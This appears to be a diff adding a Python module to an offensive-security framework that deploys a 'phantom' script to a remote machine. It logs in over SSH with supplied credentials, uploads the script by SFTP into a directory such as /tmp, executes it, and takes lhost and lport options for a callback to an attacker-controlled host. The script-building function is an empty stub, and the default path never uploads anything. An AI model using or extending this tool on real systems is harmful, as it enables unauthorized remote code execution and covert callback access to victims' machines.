@@ -1,0 +1,70 @@
+#!/usr/bin/env python
+import os
+import paramiko
+import sys
+
+meta = {
+        'author':'Benjamin Donnelly',
+        'ported_by':'Benjamin Donnelly',
+        'version':'0.1.0',
+        "info":"""Deploys and executes a phantom script via ssh"""
+}
+
+variables = {"custom":["","no","Custom script to use, blank for default"],"lhost":["","yes","The host to call back to"],"lport":["1226","yes","The port to call back to"],"rhost":["","yes","The host to connect to"],"rport":["22","yes","Port to connect to"],"username":["","yes","Username to login with"],"password":["","yes","password to login with"],"ex_dir":["/tmp","yes","directory to execute from (think privileges)"]}
+
+
+def build_script(lhost, lport):
+	return
+
+def push_script(rhost, rport, username, password, ex_dir, script_loc):
+	print "Attempting to upload script.."
+	transport = paramiko.Transport((rhost, int(rport)))
+	transport.connect(username = username, password = password)
+	sftp = paramiko.SFTPClient.from_transport(transport)
+
+	sftp.put(script_loc, ex_dir + "phantom.py")
+	sftp.close()
+	transport.close()
+	print "Script uploaded!"
+	return
+
+def ex_script(rhost, rport, username, password, ex_dir):
+	print "Attempting to execute script.."
+	ssh = paramiko.SSHClient()
+	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+	ssh.connect(rhost, username=username, password=password)
+	sin, sout, serr = ssh.exec_command("python " + ex_dir + "phantom.py")
+	return
+
+class commands:
+
+	def __init__(self):
+		return
+
+	@staticmethod
+	def run(variables, pt):
+		custom = variables['custom'][0]
+
+		script_loc = ""
+
+		lhost = variables['lhost'][0]
+		lport = variables['lport'][0]
+		rhost = variables['rhost'][0]
+		rport = variables['rport'][0]
+		username = variables['username'][0]
+		password = variables['password'][0]
+		ex_dir = variables['ex_dir'][0]
+		if ex_dir[len(ex_dir)-1] != "/":
+			ex_dir = ex_dir + "/"
+
+		if len(custom) == 0:
+			print "No custom script specified, building default.. "
+			build_script(lhost, lport)
+			script_loc = "tmp/phantom.py"
+		else:
+			print "Custom specified"
+			script_loc = custom
+			push_script(rhost, rport, username, password, ex_dir, script_loc)
+			ex_script(rhost, rport, username, password, ex_dir)
+			
+		return "Script uploaded and executed.."	
